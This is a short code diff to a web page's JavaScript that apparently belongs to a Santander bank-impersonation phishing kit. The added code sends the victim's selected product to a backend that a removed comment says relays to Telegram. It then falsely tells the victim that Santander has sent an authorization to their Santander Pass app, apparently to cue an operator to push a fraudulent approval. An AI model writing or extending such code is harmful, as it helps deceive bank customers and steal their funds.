@@ -60,15 +60,17 @@
     });
 
     document.getElementById("autorizarBtn").addEventListener("click", async () => {
+      const producto = document.getElementById("productoSeleccionado").innerText;
+
+      const mensaje = `Autoriza!!!\nProducto: ${producto}`;
+
       try {
-        // Enviar notificación al backend para que llegue a Telegram
         await fetch(AUTORIZAR_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ mensaje: "Autorizar" })
+          body: JSON.stringify({ mensaje })
         });
 
-        // Mostrar mensaje en rojo en pantalla
         document.getElementById("mensajeAutorizacion").innerText = 
           "Hemos enviado una autorización a tu App Santander Pass";
       } catch (error) {
